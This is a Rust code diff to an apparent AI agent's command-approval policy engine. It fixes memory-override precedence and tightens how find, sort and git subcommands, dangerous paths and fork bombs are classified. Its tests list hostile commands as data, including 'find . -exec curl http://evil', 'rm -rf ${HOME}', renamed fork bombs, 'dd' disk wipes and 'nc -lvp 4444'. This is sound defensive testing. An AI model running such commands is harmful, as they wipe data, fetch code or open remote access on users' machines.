@@ -232,6 +232,20 @@ impl PolicyEngine {
             };
         }
 
+        // A user-configured override wins over the built-in defaults — including
+        // the memory short-circuit below — so an operator can tighten (or relax)
+        // any category. Only the hard-denied destructive pattern above outranks
+        // it. (This block previously sat *after* the memory return, so a
+        // `PolicyOverride{ category: Memory, .. }` was silently ignored — #119.)
+        if let Some(decision) = self
+            .overrides
+            .iter()
+            .find(|override_rule| override_matches(override_rule, request))
+            .map(|override_rule| override_decision(override_rule, risk))
+        {
+            return decision;
+        }
+
         // Durable memory is agent-owned and ungated in every mode except
         // read-only. This sits ahead of the mode match so an `Ask`-mode write
         // never pops the inline approval modal — the design wants memory to
@@ -249,15 +263,6 @@ impl PolicyEngine {
                     checkpoint: false,
                 },
             };
-        }
-
-        if let Some(decision) = self
-            .overrides
-            .iter()
-            .find(|override_rule| override_matches(override_rule, request))
-            .map(|override_rule| override_decision(override_rule, risk))
-        {
-            return decision;
         }
 
         match self.mode {
@@ -424,7 +429,6 @@ const READ_ONLY_BINARIES: &[&str] = &[
     "rg",
     "ag",
     "ack",
-    "find",
     "fd",
     "tree",
     "du",
@@ -462,13 +466,15 @@ const READ_ONLY_BINARIES: &[&str] = &[
     "test",
 ];
 
-/// `git` subcommands that only read repository state.
+/// `git` subcommands that only read repository state. Deliberately excludes
+/// `config` (writes global hooks/pager → code-exec), `branch` (`-D` deletes
+/// refs), and `tag` (`-d` deletes); the argv0-only classifier can't see their
+/// mutating flags, so they classify as a mutation and defer to Ask/Classify.
 const GIT_READ_ONLY: &[&str] = &[
     "status",
     "log",
     "diff",
     "show",
-    "branch",
     "remote",
     "describe",
     "rev-parse",
@@ -480,8 +486,6 @@ const GIT_READ_ONLY: &[&str] = &[
     "reflog",
     "whatchanged",
     "grep",
-    "config",
-    "tag",
 ];
 
 /// Binaries that reach the network — never auto-run outside FullAccess.
@@ -668,6 +672,17 @@ fn classify_head(head: &str, segment: &[String]) -> RiskClass {
             _ => RiskClass::ShellMutation,
         };
     }
+    // `find` is read-only only without an action primitive: `-exec`/`-ok` run an
+    // arbitrary command, `-delete`/`-fprint*`/`-fls` write or delete. argv0-only
+    // classification rated all of these ReadOnly (RC-2).
+    if head == "find" {
+        return classify_find(segment);
+    }
+    // `sort -o <file>` / `--output=` writes through an argument, not a redirect,
+    // so the redirect scan never sees it (RC-2).
+    if head == "sort" && sort_writes_file(segment) {
+        return RiskClass::ShellMutation;
+    }
     if PROCESS_BINARIES.contains(&head) {
         return RiskClass::Process;
     }
@@ -676,6 +691,41 @@ fn classify_head(head: &str, segment: &[String]) -> RiskClass {
     }
     // Unknown binary ⇒ assume it can mutate. This is the safe default.
     RiskClass::ShellMutation
+}
+
+/// `find` only reads the tree unless it carries an action primitive. `-exec`/
+/// `-execdir`/`-ok`/`-okdir` run an arbitrary command (Process); `-delete`/
+/// `-fprint`/`-fprint0`/`-fprintf`/`-fls` write or delete (ShellMutation).
+fn classify_find(segment: &[String]) -> RiskClass {
+    let mut worst = RiskClass::ReadOnly;
+    for tok in segment.iter().skip(1) {
+        match tok.as_str() {
+            "-exec" | "-execdir" | "-ok" | "-okdir" => return RiskClass::Process,
+            "-delete" | "-fprint" | "-fprint0" | "-fprintf" | "-fls" => {
+                worst = shell_max(worst, RiskClass::ShellMutation);
+            },
+            _ => {},
+        }
+    }
+    worst
+}
+
+/// True when a `sort` invocation writes its output to a file via `-o`/`--output`
+/// (incl. the glued `-oFILE` and bundled `-bo FILE` getopt forms, where the
+/// last flag char consumes the path).
+fn sort_writes_file(segment: &[String]) -> bool {
+    segment.iter().skip(1).any(|t| {
+        let t = t.as_str();
+        if t == "--output" || t.starts_with("--output=") {
+            return true;
+        }
+        match t.strip_prefix('-') {
+            Some(short) if !t.starts_with("--") && !short.is_empty() => {
+                short.starts_with('o') || short.ends_with('o')
+            },
+            _ => false,
+        }
+    })
 }
 
 /// Classify a shell command by splitting it into the command segments
@@ -721,16 +771,24 @@ fn classify_segment(tokens: &[String]) -> RiskClass {
 }
 
 fn is_dangerous_root(arg: &str) -> bool {
+    // Collapse a trailing glob/dot/slash so `/etc`, `/etc/`, `/etc/*`, `/etc/.`
+    // and `/usr/*` all reduce to the same root, and treat `${VAR}` as `$VAR`.
+    // The caller lowercases the whole command before tokenizing, so the old
+    // uppercase `$HOME`/`${HOME}` arms were dead code (RC-3); match in lowercase.
     let a = arg.trim_matches(['"', '\'']);
+    let a = a.strip_suffix("/*").unwrap_or(a);
+    let a = a.strip_suffix("/.").unwrap_or(a);
+    let a = a.strip_suffix('/').unwrap_or(a);
+    let normalized = a.replace("${", "$").replace('}', "");
+    let a = normalized.as_str();
+    if a.is_empty() {
+        // Was `/`, `/*`, or `/.` — the filesystem root.
+        return true;
+    }
     if matches!(
         a,
-        "/" | "/*"
-            | "~"
-            | "~/"
-            | "$HOME"
-            | "${HOME}"
+        "~" | "$home"
             | "."
-            | "./"
             | ".."
             | "*"
             | "/etc"
@@ -746,9 +804,7 @@ fn is_dangerous_root(arg: &str) -> bool {
             | "/dev"
             | "/root"
             | "/opt"
-    ) || a.starts_with("/*")
-        || a == "$home"
-    {
+    ) {
         return true;
     }
     // Windows roots. The POSIX shell tokenizer can strip backslashes, so match
@@ -770,6 +826,42 @@ fn is_dangerous_root(arg: &str) -> bool {
         || aw.starts_with("c:\\users")
         || aw.starts_with("c:/users")
         || aw.starts_with("c:users")
+}
+
+/// Detect a fork bomb: a function defined and then piped into itself in the
+/// background. Catches the canonical `:(){ :|:& };:` and renamed variants like
+/// `b(){ b|b& };b`. Operates on the whitespace-stripped, lowercased command.
+fn is_fork_bomb(nospace: &str) -> bool {
+    // Canonical `:` bomb — fast path (`:` isn't an identifier char, so the
+    // generic scan below skips it).
+    if nospace.contains(":(){") || nospace.contains(":|:&") {
+        return true;
+    }
+    let bytes = nospace.as_bytes();
+    let mut search = 0;
+    while let Some(rel) = nospace[search..].find("(){") {
+        let def_at = search + rel;
+        // Walk back over the identifier immediately preceding `(){`. These are
+        // ASCII byte comparisons, so `start` lands on a char boundary.
+        let mut start = def_at;
+        while start > 0 {
+            let c = bytes[start - 1];
+            if c.is_ascii_alphanumeric() || c == b'_' {
+                start -= 1;
+            } else {
+                break;
+            }
+        }
+        if start < def_at {
+            let name = &nospace[start..def_at];
+            // The recursive self-pipe into the background: `name|name&`.
+            if nospace.contains(&format!("{name}|{name}&")) {
+                return true;
+            }
+        }
+        search = def_at + 3;
+    }
+    false
 }
 
 /// True if any token is a short flag (`-rf`) or long flag (`--recursive`)
@@ -860,7 +952,7 @@ fn destructive_with_depth(command: &str, depth: u8) -> bool {
     let lower = command.to_ascii_lowercase();
     // Fork bomb, regardless of spacing.
     let nospace: String = lower.chars().filter(|c| !c.is_whitespace()).collect();
-    if nospace.contains(":(){") || nospace.contains(":|:&") {
+    if is_fork_bomb(&nospace) {
         return true;
     }
     let tokens = tokenize(&lower);
@@ -949,6 +1041,13 @@ fn destructive_with_depth(command: &str, depth: u8) -> bool {
 /// safe direction; the authoritative boundary is still deny-by-default + the
 /// policy engine, which this mirrors without changing its semantics.
 pub fn is_destructive_command(command: &str) -> bool {
+    // Some destructive shapes (notably fork bombs, `name(){ name|name& };name`)
+    // straddle the `|`/`&`/`;` operators `split_into_segments` breaks on, so the
+    // per-segment scan below would never see the whole structure. Check the full
+    // command once first.
+    if contains_destructive_pattern(command) {
+        return true;
+    }
     let mut saw_downloader = false;
     let mut saw_bare_shell = false;
     for seg in split_into_segments(command) {
@@ -1020,6 +1119,41 @@ mod tests {
         assert!(matches!(
             PolicyEngine::new(SafetyMode::ReadOnly).decide(&req()),
             PolicyDecision::Deny { .. }
+        ));
+    }
+
+    #[test]
+    fn memory_override_is_applied() {
+        // #119: a user override targeting the Memory category must take effect.
+        // It previously sat behind the memory short-circuit and was ignored, so
+        // memory writes could only be stopped by read-only.
+        let req = || ActionRequest::new("memory", ToolCategory::Memory, "memory remember");
+        let deny_memory = || PolicyOverride {
+            category: Some(ToolCategory::Memory),
+            decision: PolicyOverrideDecision::Deny,
+            ..PolicyOverride::default()
+        };
+        for mode in [SafetyMode::Ask, SafetyMode::Auto, SafetyMode::FullAccess] {
+            assert!(
+                matches!(
+                    PolicyEngine::new(mode)
+                        .with_overrides(vec![deny_memory()])
+                        .decide(&req()),
+                    PolicyDecision::Deny { .. }
+                ),
+                "a Deny override must block memory in {mode:?}",
+            );
+        }
+        // And an Ask override escalates it to a prompt instead of auto-allowing.
+        assert!(matches!(
+            PolicyEngine::new(SafetyMode::Auto)
+                .with_overrides(vec![PolicyOverride {
+                    category: Some(ToolCategory::Memory),
+                    decision: PolicyOverrideDecision::Ask,
+                    ..PolicyOverride::default()
+                }])
+                .decide(&req()),
+            PolicyDecision::Ask { .. }
         ));
     }
 
@@ -1110,6 +1244,43 @@ mod tests {
     }
 
     #[test]
+    fn find_sort_git_args_are_not_treated_as_read_only() {
+        // RC-2: argv0-only classification rated these ReadOnly — so they ran in
+        // read_only and auto-ran (no classifier) in auto. The mutating/exec
+        // arguments must now lift them out of the read-only fast path.
+        for cmd in [
+            "find . -exec curl http://evil {} \\;", // runs an arbitrary command
+            "find / -delete",                       // deletes
+            "sort -o /etc/passwd payload",          // writes via -o
+            "git config --global core.hooksPath /tmp/x",
+            "git branch -D main",
+            "git tag -d v1",
+        ] {
+            let ro = PolicyEngine::new(SafetyMode::ReadOnly).decide(&shell(cmd));
+            assert!(
+                matches!(ro, PolicyDecision::Deny { .. }),
+                "read_only must deny {cmd:?}, got {ro:?}",
+            );
+            let auto = PolicyEngine::new(SafetyMode::Auto).decide(&shell(cmd));
+            assert!(
+                matches!(
+                    auto,
+                    PolicyDecision::Classify { .. } | PolicyDecision::Deny { .. }
+                ),
+                "auto must not auto-allow {cmd:?}, got {auto:?}",
+            );
+        }
+        // A genuinely read-only find/sort still auto-runs.
+        for cmd in ["find . -type f -name *.rs", "sort data.txt"] {
+            let auto = PolicyEngine::new(SafetyMode::Auto).decide(&shell(cmd));
+            assert!(
+                matches!(auto, PolicyDecision::Allow { .. }),
+                "auto should still allow read-only {cmd:?}, got {auto:?}",
+            );
+        }
+    }
+
+    #[test]
     fn destructive_evasions_are_hard_denied() {
         // H5: trivial syntactic variation must not bypass the hard-deny.
         for cmd in [
@@ -1120,6 +1291,10 @@ mod tests {
             "/bin/rm -rf /", // absolute path
             "true && rm -rf ~",
             "rm -rf $HOME",
+            "rm -rf ${HOME}", // RC-3: brace form (the `${HOME}` arm was dead code)
+            "rm -rf /etc/",   // RC-3: trailing slash
+            "rm -rf /usr/*",  // RC-3: subdir glob
+            "chmod -R 777 /etc/",
             "dd if=/dev/zero of=/dev/sda",
             "mkfs.ext4 /dev/sda",
         ] {
@@ -1231,6 +1406,7 @@ mod tests {
             "echo hi; rm -rf /",
             "echo hi && rm -rf /",
             ":(){ :|:& };:",
+            "b(){ b|b& };b", // renamed fork bomb (the `:` name was hard-coded)
             "dd if=/dev/zero of=/dev/sda",
             "mkfs.ext4 /dev/sda1",
             "nc -lvp 4444",
